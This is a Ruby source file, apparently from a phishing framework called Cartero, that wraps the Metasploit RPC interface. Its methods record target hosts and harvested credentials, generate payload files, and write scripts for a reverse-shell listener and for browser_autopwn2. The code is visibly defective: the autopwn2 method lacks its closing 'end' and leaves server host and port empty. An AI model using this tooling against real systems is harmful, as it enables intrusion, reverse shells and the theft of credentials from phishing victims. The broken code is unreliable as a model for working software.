#encoding: utf-8
require 'command_line_reporter'
require 'msfrpc-client'

module Cartero
# Documentation for Metasploit
class Metasploit
  include CommandLineReporter

  attr_reader :client
  attr_reader :options

  def fix_options(opts = {})
    opts.each do |k, v|
      opts[k.to_sym] = v
    end
  end

  def initialize(options = {})
    @options = options
    @client = Msf::RPC::Client.new(:host=>@options["host"] || "192.168.1.216", :port => @options["port"] || '4567')
  end

  def token
    @client.token
  end

  def login(u = nil, p = nil)
    @options["username"] = u unless u.nil?
    @options["password"] = p unless p.nil?
    @client.login(@options["username"], @options["password"])
  end

  def db_connect(uname = nil, pwd = nil, db = nil)
    call("db.connect", {
      :username => uname || @options['db_user'] || "msf", # default db username "msf"
      :password => pwd || @options['db_pwd'] || "", # default db password is ""
      :database => db || @options['db_name'] || "msf" # default db name is "msf"
    })
  end

  def hosts(opts={})
    call("db.hosts", opts)
  end

  def get_workspace(wname = nil)
    @client.call("db.get_workspace", wname || @options["workspace"] || "default")["workspace"][0]
  end

  def add_host(opts)
    # { workspace: "default", host: "192.168.2.153",
    #   os_name: "Windows 8", os_lang: "en-US", os_flavor: "Plus",
    #   info: "John Doe johndoe@corpox.com", name: "Windows8"
    # }
    call("db.report_host", opts )
  end

  def creds(opts={})
    @client.call("db.creds", opts)
  end

  def add_cred(opts)
    opts[:workspace_id] = get_workspace(opts[:workspace])["id"].to_i || 1 if opts[:workspace_id].nil?
    # {
    #  origin_type: :service, address: '192.168.19.1', port: 9090, service_name: 'http', protocol: 'tcp',
    #  module_fullname: 'auxiliary/scanner/http/cartero', workspace_id: 1,
    #  private_data: 'password1', private_type: :password, username: 'Administrator',
    #  last_attempted_at: Time.now.to_s, status: "Successful"
    # }
    call("db.create_credential", opts )
  end

  def clients(opts={})
    call("db.clients", opts)
  end

  def add_client(opts)
    call("db.report_client", opts )
  end

  def call(*args)
    try = true
    begin
      @client.call(*args)
    rescue
      if try
        @client.login(@options["username"], @options["password"])
        try = false
        retry
      end
    end
  end

  def info(type,name)
    call("module.info", type, name)
  end

  def execute(type, name, opts={})
    call("module.execute", type, name, opts)
  end

  def generate_payload(name, options={})
    file_path = options["filepath"]
    options.delete("filepath")
    options.merge!(generate_datastore(name, options["datastore"]))
    options.delete("datastore")
    begin
      payload = call('module.execute', "payload", name, options)["payload"]
    rescue Msf::RPC::Exception => e
      $stderr.puts e.to_s
    end
    output_stream = File.open(file_path, "w")
    output_stream.binmode
    output_stream.write payload
  end

  def list(cmd)
    t = []
    case cmd
    when "encoders"
      call("module.encoders")["modules"].each { |x| t << info("encoders", x).merge({:path => x }) }
      display_list(t)
    when "nops"
      call("module.nops")["modules"].each { |x| t << info("nops", x).merge({:path => x }) }
      display_list(t)
    when "payloads"
      call("module.payloads")["modules"].each { |x| t << info("payloads", x).merge({:path => x }) }
      display_list(t)
    else
      raise StandardError, "Not a valid module."
    end
  end

  def generate_listener_script(payload, ds)
    datastore = generate_datastore(payload, ds)
    return "use exploit/multi/handler\n" +
           "set PAYLOAD #{payload}\n" +
           "set LHOST #{datastore['LHOST']}\n" +
           "set LPORT #{datastore['LPORT'] || '4444'}\n" +
           "set ExitOnSession false\n" +
           "exploit -j\n"
  end

  def generate_autopwn2_script(payload, ds)
    datastore = generate_datastore(payload, ds)
    return "use auxiliary/server/browser_autopwn2\n" +
           "set SRVHOST \n" +
           "set SRVPORT \n" +
           "set URIPATH carteropwn\n" +
           "exploit\n"

  private

  def generate_datastore(payload, ds)
    datastore = {}
    ds.split(" ").each do |x|
      k,v = x.split('=', 2)
      datastore[k.upcase] = v.to_s
    end
    if payload.to_s =~ /[\_\/]reverse/ && datastore['LHOST'].nil?
      datastore['LHOST'] = local_ip
    end
    return datastore
  end

  def local_ip
    require 'socket'
    orig, Socket.do_not_reverse_lookup = Socket.do_not_reverse_lookup, true

    UDPSocket.open do |s|
      s.connect '64.233.187.99', 1
      s.addr.last
    end
  ensure
    Socket.do_not_reverse_lookup = orig
  end

  def display_list(c)
    return if c.empty?
    table() do
      row(:header => true, :bold => true) do
        column('NAME',      :width => 50)
        column('SHORT DESCRIPTION',:width => 100)
      end
      c.each_with_index do |p|
        row() do
          column(p[:path], :color => "blue")
          column(p["description"].strip.split("\n")[0])
        end
      end
    end
  end
end
end
